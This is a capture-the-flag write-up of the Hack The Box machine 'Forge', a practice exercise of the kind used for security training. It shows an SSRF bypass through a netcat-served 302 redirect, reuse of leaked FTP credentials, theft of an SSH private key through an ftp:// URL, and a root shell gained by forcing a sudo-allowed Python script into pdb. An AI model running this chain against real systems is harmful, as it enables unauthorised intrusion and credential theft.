---
id: 962
title: "Forge HTB Writeup"
created: 2024-12-13T18:09:25+00:00
url: https://hacklido.com/blog/962-forge-htb-writeup
words: 1992
---

# Forge HTB Writeup

[image]

### Task 1: How many open TCP ports are listening on Forge?

```
`└──╼ [★]$ nmap --min-rate 10000 -A -p- forge.htb
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-13 04:03 CST
Nmap scan report for forge.htb (10.129.53.139)
Host is up (0.28s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE    SERVICE VERSION
21/tcp filtered ftp
22/tcp open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 4f:78:65:66:29:e4:87:6b:3c:cc:b4:3a:d2:57:20:ac (RSA)
|   256 79:df:3a:f1:fe:87:4a:57:b0:fd:4e:d0:54:c6:28:d9 (ECDSA)
|_  256 b0:58:11:40:6d:8c:bd:c5:72:aa:83:08:c5:51:fb:33 (ED25519)
80/tcp open     http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Gallery`
```

Answer:

```
`2`
```

### Task 2: What TCP port is reported as filtered by `nmap`?

From previous task we can see that `port 21` is filtered.

Answer:

```
`21`
```

### Task 3: What is the full domain name of the subdomain of the default domain used by the website?

For this task we need to fuzz or enumerate and find subdomains. We will be using the following command to do that. Let’s filter out all responses like `404,403, and 302` we get our answer.

```
`└──╼ [★]$ wfuzz -u http://forge.htb -H "Host: FUZZ.forge.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --hc 404,403,302
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://forge.htb/
Total requests: 19966

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000024:   200        1 L      4 W        27 Ch       "admin"           `
```

Answer:

```
`admin.forge.htb`
```

Make sure to add this subdomain to `/etc/hosts` file.

### Task 4: In addition to HTTP, what other protocol is supported in the URLs provided to the “upload from url” form?

This one should be obvious, we check the web page and in answer it says 5 stars which is `(*****)` .

Answer:

```
`https`
```

### Task 5: What is the text in the `<center><h1>` tags on the admin site?

Hint - `Trying to access `admin.forge.htb` directly or from the URL field is blocked. What happens if we have the URL contact us and then we return an HTTP 302?`

We see that the endpoint `admin.forge.htb` is not at all accessible and there is nothing we can do. But remember we have an option to upload as URL on `forge.htb` let’s utilize this functionality and see if we can do something.

We tried redirecting to `admin.forge.htb`, changed it’s case to bypass filters like `AdMiN.fOrGe.hTb` but nothing works. Let take a pause, and touch some grass and let’s get back to hack. Now we are stuck, so we take an look at hint and ponder what we can do. Hmm we should redirect the request made to `302`. We can do that on netcat. Let’s make an request for the endpoint we are trying to bypass that is `admin.forge.htb`

```
`HTTP/1.1 302 Found
Location: http://admin.forge.htb/`
```

Save this file as `http.req` and let’s start our listener.

```
`└──╼ [★]$ sudo nc -nlvp 8000 < http.req`
```

[image]

- First click the option to `upload from url`

- Then enter our localhost that we are hosting on netcat

- Enter Submit button you should get an URL. Once you get request on your netcat listener hit `ctrl + c` to stop the process, then you should get the URL for the file you have uplaoded.

- Visit the URL via curl to get our answer for this task.

[image]

Answer:

```
`Welcome Admins!`
```

### Task 6: What is the password for the user user on the FTP server?

Let’s ponder over the previous task, we got admin dashboard but it also has an `/announcements`. So let’s iterate the previous task this time to get `/announcements` section on the admin subdomain.

STEP 1: Create an http.request to redirect to the desired target.

```
`HTTP/1.1 302 Found
Location: http://admin.forge.htb/announcements`
```

STEP 2: Start netcat listener.

```
`sudo nc -nlvp 8000 < http.req`
```

STEP 3: Visit the endpoint, and on upload as url option enter your localhost IP address with right port number to perform RFI attack (Remote File Inclusion).

[image]

- First click the option to `upload from url`

- Then enter our localhost that we are hosting on netcat

- Enter Submit button you should get an URL. Once you get request on your netcat listener hit `ctrl + c` to stop the process, then you should get the URL for the file you have uplaoded.

- Visit the URL via curl to get our answer for this task.

Now let’s curl the request and see what we got.

```
`└──╼ [★]$ curl http://forge.htb/uploads/uhIkIHlvObStiy3Lujrv
<!DOCTYPE html>
<html>
<head>
    <title>Announcements</title>
</head>
<body>
    <link rel="stylesheet" type="text/css" href="/static/css/main.css">
    <link rel="stylesheet" type="text/css" href="/static/css/announcements.css">
    <header>
            <nav>
                <h1 class=""><a href="/">Portal home</a></h1>
                <h1 class="align-right margin-right"><a href="/announcements">Announcements</a></h1>
                <h1 class="align-right"><a href="/upload">Upload image</a></h1>
            </nav>
    </header>
    <br><br><br>
    <ul>
        <li>An internal ftp server has been setup with credentials as user:heightofsecurity123!</li>
        <li>The /upload endpoint now supports ftp, ftps, http and https protocols for uploading from url.</li>
        <li>The /upload endpoint has been configured for easy scripting of uploads, and for uploading an image, one can simply pass a url with ?u=&lt;url&gt;.</li>
    </ul>
</body>
</html>`
```

Answer:

```
`heightofsecurity123!`
```

### Task 7: What is the HTTP GET parameter on `admin.forge.htb/upload` for passing a URL that handles the FTP protocol?

Let’s carefully look at `/announcements` from `admin.forge.htb`, we clearly see what method can be used, since in the `/announcements` they mentioned about something adding to URL which is nothing but `?u=&lt;url&gt` [which means if something is added in URL it’s mostly and GET request].

Answer:

```
`u`
```

### Task 8: Submit the flag located in the user user’s home directory.

Like in previous step let’s re do all the steps but we will be changing the `http.req` file.

```
`HTTP/1.1 302 Found
Location: http://admin.forge.htb/upload?u=ftp://user:heightofsecurity123!@127.0.0.1/`
```

We re do the 4 steps, start listener, make an request to our netcat, stop netcat, and curl the file upload url and we get the following details.

```
`└──╼ [★]$ curl http://forge.htb/uploads/xvyJ4ZoiP9jpJYAlzUJS
drwxr-xr-x    3 1000     1000         4096 Aug 04  2021 snap
-rw-r-----    1 0        1000           33 Dec 13 15:18 user.txt`
```

So let’s add `user.txt` to the location at end and our new `http.req` must look something like this.

```
`HTTP/1.1 302 Found
Location: http://admin.forge.htb/upload?u=ftp://user:heightofsecurity123!@127.0.0.1/`
```

Now if we redo the steps from previous tasks we should get `user.txt`.

To get into machine let’s try getting ssh, so that we can change the `http.req` to the following and redo the steps.

```
`HTTP/1.1 302 Found
Location: http://admin.forge.htb/upload?u=ftp://user:heightofsecurity123!@127.0.0.1/.ssh/id_rsa`
```

An little research over how to perform ftp request using http request won’t hurt I guess.

Now since we have `id_rsa` file let’s change it’s executable permissions and since we have found flag inside `user.txt` let’s ssh into the account of  `user`.

```
`chmod 600 id_rsa
ssh user@10.129.187.4 -i id_rsa`
```

### Task 9: What is the full path to the script that the user user can run as root without a password?

We will be using the classic `sudo -l` command to figure answer for this task.

```
`user@forge:~$ sudo -l
Matching Defaults entries for user on forge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user may run the following commands on forge:
    (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/remote-manage.py`
```

Answer:

```
`/opt/remote-manage.py`
```

### Task 10: What is the imported Python module that, if invoked, will drop to an interactive debugging session?

For answering this task let’s analyze the python code present inside `/opt/remote-manage.py`.

```
`#!/usr/bin/env python3
import socket
import random
import subprocess
import pdb

port = random.randint(1025, 65535)

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('127.0.0.1', port))
    sock.listen(1)
    print(f'Listening on localhost:{port}')
    (clientsock, addr) = sock.accept()
    clientsock.send(b'Enter the secret passsword: ')
    if clientsock.recv(1024).strip().decode() != 'secretadminpassword':
        clientsock.send(b'Wrong password!\n')
    else:
        clientsock.send(b'Welcome admin!\n')
        while True:
            clientsock.send(b'\nWhat do you wanna do: \n')
            clientsock.send(b'[1] View processes\n')
            clientsock.send(b'[2] View free memory\n')
            clientsock.send(b'[3] View listening sockets\n')
            clientsock.send(b'[4] Quit\n')
            option = int(clientsock.recv(1024).strip())
            if option == 1:
                clientsock.send(subprocess.getoutput('ps aux').encode())
            elif option == 2:
                clientsock.send(subprocess.getoutput('df').encode())
            elif option == 3:
                clientsock.send(subprocess.getoutput('ss -lnt').encode())
            elif option == 4:
                clientsock.send(b'Bye\n')
                break
except Exception as e:
    print(e)
    pdb.post_mortem(e.__traceback__)
finally:
    quit()`
```

- What the code does:

    This Python script sets up a local TCP server on a random port that prompts a connected client for a password and provides a menu-driven interface to execute system commands like viewing processes, free memory, listening sockets, and quitting.

- Important parts of the code:

    The key components are the socket setup for TCP communication (`socket.socket` and `sock.listen`), the password validation logic, the use of `subprocess.getoutput` to execute system commands based on user input, and error handling with `pdb.post_mortem`.

- Interactive debugging module:

    The imported Python module for interactive debugging is `pdb`.

Answer:

```
`pdb`
```

Let’s do make a note of password from the python script which seems to be `secretadminpassword`

### Task 11: Submit the flag located in the root user’s home directory.

For this task we will be needing two terminals one for running the script and another to connecting back and running the debugger.

Let’s make sure before we proceed we have another terminal opened up with ssh connection to the same host using the command `ssh user@10.129.187.4 -i id_rsa`.

On your `first terminal` run the program with sudo permissions using the following command.

```
`user@forge:~$ sudo python3 /opt/remote-manage.py
Listening on localhost:56863`
```

Now in another terminal which has second ssh connection, start your netcat listener to the same port, enter your password.

```
`user@forge:~$ nc localhost 56863
Enter the secret passsword: secretadminpassword
Welcome admin!`
```

Now it will prompt you 4 options, you have to type in any non numeric character to trigger the `pdb debugger`. In my example I have typed in `abcd`.

```
`user@forge:~$ nc localhost 56863
Enter the secret passsword: secretadminpassword
Welcome admin!

What do you wanna do:
[1] View processes
[2] View free memory
[3] View listening sockets
[4] Quit
abcd`
```

Now switch back to `first terminal` and you should see `pdb` must be enabled now type in the following command to elevate the privilges.

```
`(Pdb) import os; os.system('/bin/bash');
root@forge:/home/user#`
```

Now it’s time to get the `root` flag and we have solved this machine.

```
`root@forge:/home/user# cat /root/root.txt`
```
